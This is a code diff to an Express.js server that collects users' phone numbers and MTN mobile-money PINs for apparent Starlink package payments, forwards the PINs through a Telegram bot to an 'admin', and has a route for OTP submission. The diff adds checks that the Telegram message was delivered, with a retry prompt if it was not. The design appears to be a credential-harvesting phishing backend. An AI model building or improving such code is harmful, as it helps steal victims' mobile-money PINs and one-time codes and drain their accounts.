@@ -178,7 +178,7 @@ app.post('/api/mtn/submit', (req, res) => {
     const requestId = 'REQ-' + Date.now().toString(36).toUpperCase();
     setMtnState(requestId, 'pending', { phone, pin, country, package: starlinkPackage });
     
-    createApprovalRequest({
+    const { delivered } = createApprovalRequest({
         userPhone: phone,
         userPin: pin,
         package: starlinkPackage || 'N/A',
@@ -195,6 +195,9 @@ app.post('/api/mtn/submit', (req, res) => {
         onInvalid: (id) => setMtnState(id, 'invalid'),
         onTimeout: (id) => setMtnState(id, 'timeout')
     });
+
+    // Surface delivery so the client knows the admin was actually notified.
+    delivered.then((ok) => auditLog.write('MTN_APPROVAL_DELIVERY', { requestId, delivered: ok }));
     
     res.json({ success: true, message: 'MTN payment initiated', requestId });
 });
@@ -334,7 +337,7 @@ app.post('/api/mtn/update-status', (req, res) => {
 // ── Telegram Bot API Routes ───────────────────────────────────
 
 // Create a new payment approval request
-app.post('/api/telegram/request-approval', validateApiSecret, rateLimit({ maxRequests: 5, windowMs: 60000 }), (req, res) => {
+app.post('/api/telegram/request-approval', validateApiSecret, rateLimit({ maxRequests: 5, windowMs: 60000 }), async (req, res) => {
     const { userPhone, userPin, package: pkg, amount, method } = req.body;
     const clientIp = req.ip || 'unknown';
     
@@ -356,7 +359,7 @@ app.post('/api/telegram/request-approval', validateApiSecret, rateLimit({ maxReq
         return res.status(400).json({ success: false, message: 'Invalid payment method' });
     }
 
-    const requestId = createApprovalRequest({
+    const { requestId, delivered } = createApprovalRequest({
         userPhone: validator.sanitize(userPhone),
         userPin: validator.sanitize(userPin),
         package: validator.sanitize(pkg),
@@ -401,7 +404,17 @@ app.post('/api/telegram/request-approval', validateApiSecret, rateLimit({ maxReq
     });
 
     auditLog.logTelegramRequest(clientIp, userPhone, pkg, method, requestId);
-    res.json({ success: true, requestId, message: 'Approval request sent to admin' });
+    // Report honestly whether Telegram actually received the request, instead
+    // of always claiming success.
+    const alerted = await delivered;
+    res.json({
+        success: true,
+        requestId,
+        delivered: alerted,
+        message: alerted
+            ? 'Approval request sent to admin'
+            : 'Request received, but the admin could not be notified. Please retry shortly.'
+    });
 });
 
 // Submit OTP for verification
